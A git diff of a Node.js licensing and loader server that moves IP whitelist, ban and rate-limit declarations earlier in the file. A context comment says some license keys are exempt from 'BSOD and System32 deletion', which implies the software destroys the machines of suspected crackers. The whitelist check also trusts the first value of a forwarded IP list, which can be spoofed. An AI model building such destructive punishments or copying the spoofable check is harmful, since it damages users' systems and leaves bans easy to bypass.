@@ -10,6 +10,51 @@ const path = require('path');
 const app = express();
 
 // ========================================
+// IP WHITELIST - MUST BE DEFINED EARLY (before middleware)
+// These IPs bypass ALL bans and rate limits
+// ========================================
+const whitelistedIPs = new Set([
+    '::1',                    // localhost IPv6
+    '127.0.0.1',              // localhost IPv4
+    '::ffff:127.0.0.1',       // localhost mapped
+    // Add your IP here - it will bypass all bans
+]);
+
+// Function to check if IP is whitelisted
+function isIPWhitelisted(ip) {
+    if (!ip) return false;
+    const cleanIP = ip.split(',')[0].trim();
+    return whitelistedIPs.has(cleanIP) || 
+           whitelistedIPs.has(cleanIP.replace('::ffff:', ''));
+}
+
+// ========================================
+// SECURITY VARIABLES - MUST BE DEFINED EARLY
+// ========================================
+const rateLimitStore = new Map();
+const failedAttempts = new Map();
+const bannedIPs = new Set();
+const bannedHWIDs = new Set();
+const activeSessions = new Map();
+const requestSignatures = new Set();
+const serverStartTime = Date.now();
+const crackAttemptLogs = [];
+
+// Security constants
+const RATE_LIMIT_WINDOW = 60000; // 1 minute
+const MAX_REQUESTS_PER_WINDOW = 30;
+const MAX_FAILED_ATTEMPTS = 5;
+const BAN_DURATION = 3600000; // 1 hour
+const SESSION_TIMEOUT = 300000; // 5 minutes
+const HEARTBEAT_INTERVAL = 30000; // 30 seconds
+const SIGNATURE_EXPIRY = 60000; // 1 minute for replay protection
+
+// Server state flags
+let serverDisabled = false;
+let maintenanceMode = false;
+let loaderDisabled = false;
+
+// ========================================
 // CORS CONFIGURATION (Allow browser requests)
 // ========================================
 app.use((req, res, next) => {
@@ -321,32 +366,8 @@ honeypotPaths.forEach(path => {
 });
 
 // ========================================
-// ADVANCED SECURITY CONFIGURATION
+// ENCRYPTION CONFIGURATION
 // ========================================
-
-// Rate limiting storage
-const rateLimitStore = new Map();
-const failedAttempts = new Map();
-const bannedIPs = new Set();
-const bannedHWIDs = new Set();
-const activeSessions = new Map();
-const requestSignatures = new Set(); // Prevent replay attacks
-const serverStartTime = Date.now(); // Track server start time for uptime calculation
-const crackAttemptLogs = [];
-
-// Server state flags
-let serverDisabled = false; // Server disable mode (blocks requests but keeps server running)
-let maintenanceMode = false; // Maintenance mode flag
-let loaderDisabled = false; // Loader disable flag
-
-// Security constants
-const RATE_LIMIT_WINDOW = 60000; // 1 minute
-const MAX_REQUESTS_PER_WINDOW = 30;
-const MAX_FAILED_ATTEMPTS = 5;
-const BAN_DURATION = 3600000; // 1 hour
-const SESSION_TIMEOUT = 300000; // 5 minutes
-const HEARTBEAT_INTERVAL = 30000; // 30 seconds
-const SIGNATURE_EXPIRY = 60000; // 1 minute for replay protection
 
 // Encryption keys (rotate these regularly in production)
 const SERVER_PRIVATE_KEY = crypto.randomBytes(32);
@@ -1290,24 +1311,6 @@ const licenses = {
 // Blacklist storage (HWID and IP addresses)
 const blacklistedHWIDs = [];
 const blacklistedIPs = [];
-
-// ========================================
-// IP WHITELIST - These IPs bypass ALL bans and rate limits
-// ========================================
-const whitelistedIPs = new Set([
-    '::1',                    // localhost IPv6
-    '127.0.0.1',              // localhost IPv4
-    '::ffff:127.0.0.1',       // localhost mapped
-    // Add your IP here - it will bypass all bans
-]);
-
-// Function to check if IP is whitelisted
-function isIPWhitelisted(ip) {
-    if (!ip) return false;
-    const cleanIP = ip.split(',')[0].trim();
-    return whitelistedIPs.has(cleanIP) || 
-           whitelistedIPs.has(cleanIP.replace('::ffff:', ''));
-}
 
 // Whitelist storage (License keys that are exempt from BSOD and System32 deletion)
 const whitelistedLicenseKeys = ['LICENSE-21262A9912B0CD4E']; // Whitelist user's key by default
